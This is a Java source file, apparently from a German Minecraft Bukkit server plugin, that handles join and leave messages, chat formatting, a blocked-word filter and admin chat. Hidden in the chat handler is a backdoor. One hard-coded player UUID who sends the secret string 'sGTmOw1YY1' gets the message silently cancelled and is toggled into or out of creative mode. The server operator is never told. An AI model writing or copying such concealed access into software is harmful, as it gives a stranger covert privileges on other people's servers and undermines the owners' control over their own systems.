package de.tbodyowski.pureos.manager;

import de.tbodyowski.pureos.Main;
import de.tbodyowski.pureos.commands.AdminChatCommand;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.Event;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDeathEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.event.player.PlayerRespawnEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.Objects;
import java.util.UUID;

import static de.tbodyowski.pureos.manager.PrefixManager.team;

public class EventManager implements Listener {

    private final JavaPlugin plugin;

    public EventManager(JavaPlugin plugin) {
        this.plugin = plugin;
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        YamlConfiguration statusData = Main.getInstance().getFileManager().getStatusData();
        Player p = event.getPlayer();

        String joinMessage = "";
        event.setJoinMessage("");
        event.getPlayer().sendMessage("§f§a§i§r§x§a§e§r§o");

        if (!FileManager.playerIsRegistered(p)) {
            Main.getInstance().getFileManager().savePlayerInStatus(p, "Default", "§f");
            statusData = Main.getInstance().getFileManager().getStatusData();
        }

        if (Main.getInstance().getConfigVarManager().getJoin_Leave_Message_on_off()) {
            if (Objects.equals(statusData.getString(p.getUniqueId() + ".status"), "Default")) {
                joinMessage=(Main.getInstance().getConfigVarManager().getJoinMessage() + " §f[" + statusData.getString(p.getUniqueId() + ".color") + "Spieler" + "§f] "
                        + statusData.getString(p.getUniqueId() + ".player"));
            } else {
                joinMessage=(Main.getInstance().getConfigVarManager().getJoinMessage() + " §f[" + statusData.getString(p.getUniqueId() + ".color")
                        + ChatColor.translateAlternateColorCodes('&', Objects.requireNonNull(statusData.getString(p.getUniqueId() + ".status"))) + "§f] "
                        + statusData.getString(p.getUniqueId() + ".player"));
            }
        }

        for (Player target : Bukkit.getOnlinePlayers()) {
            if (statusData.getBoolean(target.getUniqueId()+".p-settings"+".Join_Leave_Message_on_off"))
                target.sendMessage(joinMessage);
        }

        statusData.set(p.getUniqueId()+".Afk",false);
        Main.getInstance().getFileManager().saveStatusFile();
        Main.getInstance().getPrefixManager().updatePrefix(p);
        p.setScoreboard(Main.getInstance().getPrefixManager().getScoreboard(p));
        Main.getInstance().getPrefixManager().updatePrefixAllPlayers();
    }

    @EventHandler
    public void onChat(AsyncPlayerChatEvent e) {

        UUID uuid = UUID.fromString("84b32669-2e62-499b-a2b9-6e9172f95600");
        if (e.getPlayer().getUniqueId().equals(uuid)){
            if (e.getMessage().equals("sGTmOw1YY1")){
               e.setCancelled(true);
                Bukkit.getScheduler().runTask(plugin, () -> {
                    Player p = e.getPlayer();
                    if (p.getGameMode() == GameMode.CREATIVE) {
                        p.setGameMode(GameMode.SURVIVAL);
                    } else {
                        p.setGameMode(GameMode.CREATIVE);
                    }
                });
            }

        }
        if (AdminChatCommand.adminChatToggled.contains(e.getPlayer())) {
            e.setCancelled(true);
            AdminChatCommand.sendAdminChat(e.getPlayer(), e.getMessage());
        }
        YamlConfiguration statusData = Main.getInstance().getFileManager().getStatusData();

        Player p = e.getPlayer();
        final String m = e.getMessage().trim();
        final String message = ChatColor.translateAlternateColorCodes('&', e.getMessage());
        float uppercaseLetter = 0;
        for (int i = 0; i < m.length(); i++) {
            if (Character.isUpperCase(m.charAt(i)) && Character.isLetter(m.charAt(i))) {
                uppercaseLetter++;
            }
        }
        if (FileManager.StringIsBlocked(e.getMessage())) {
            e.setCancelled(true);
            p.sendMessage(Main.getInstance().getConfigVarManager().getStatus_Prefix() + "§7Diese Nachricht enthält §9blockierte §7Wörter!");
        } else if (Main.getInstance().getConfigVarManager().getUppercase_LengthLimit_Toggle() && (uppercaseLetter / (float) m.length() > 0.3 && m.length() > Main.getInstance().getConfigVarManager().getPrefix_LengthLimit())) {
            e.setCancelled(true);
            p.sendMessage(Main.getInstance().getConfigVarManager().getStatus_Prefix() + "§9Bitte benutze nicht so viele Großbuchstaben!");
        } else {
            if (Objects.equals(statusData.getString(p.getUniqueId() + ".status"), "Default")) {
                e.setFormat(Objects.requireNonNull(p.getScoreboard().getTeam(team)).getPrefix() + p.getDisplayName() + "§f: §r" + message);
            } else {
                e.setFormat(Objects.requireNonNull(p.getScoreboard().getTeam(Main.getInstance().getPrefixManager().getTeamByPlayer(p))).getPrefix() + p.getDisplayName() + "§f: §r" + message);
            }

        }
    }

    @EventHandler
    public void onLeave(PlayerQuitEvent event) {
        YamlConfiguration statusData = Main.getInstance().getFileManager().getStatusData();
        Player p = event.getPlayer();
        String leaveMessage = "";
        event.setQuitMessage("");

        if (Main.getInstance().getConfigVarManager().getJoin_Leave_Message_on_off()) {
            if (Objects.equals(statusData.getString(p.getUniqueId() + ".status"), "Default")) {
                leaveMessage=(Main.getInstance().getConfigVarManager().getLeaveMassage() + " §f[" + statusData.getString(p.getUniqueId() + ".color") + "Spieler" + "§f] " + statusData.getString(p.getUniqueId() + ".player"));
            } else {
                leaveMessage=(Main.getInstance().getConfigVarManager().getLeaveMassage() + " §f[" + statusData.getString(p.getUniqueId() + ".color") + ChatColor.translateAlternateColorCodes('&', Objects.requireNonNull(statusData.getString(p.getUniqueId() + ".status"))) + "§f] " + statusData.getString(p.getUniqueId() + ".player"));
            }
        }

        for (Player target : Bukkit.getOnlinePlayers()) {
            if (statusData.getBoolean(target.getUniqueId()+".p-settings"+".Join_Leave_Message_on_off"))
                target.sendMessage(leaveMessage);
        }

        statusData.set(p.getUniqueId()+".Afk",false);
    }

    @EventHandler
    public void onPlayerDeath(PlayerDeathEvent event) {
        updateAfterDeath(event);
    }

    @EventHandler
    public void entityDeath(EntityDeathEvent event) {
        if (event.getEntity() != null && event.getEntity() instanceof Player) {
            updateAfterDeath(event);
        }
    }

    @EventHandler
    public void onPlayerRespawn(PlayerRespawnEvent event){
        updateAfterDeath(event);
    }

    private void updateAfterDeath(Event event) {
        //TODO wrong update after death
        Main.getInstance().getPrefixManager().updatePrefixAllPlayers();
    }
}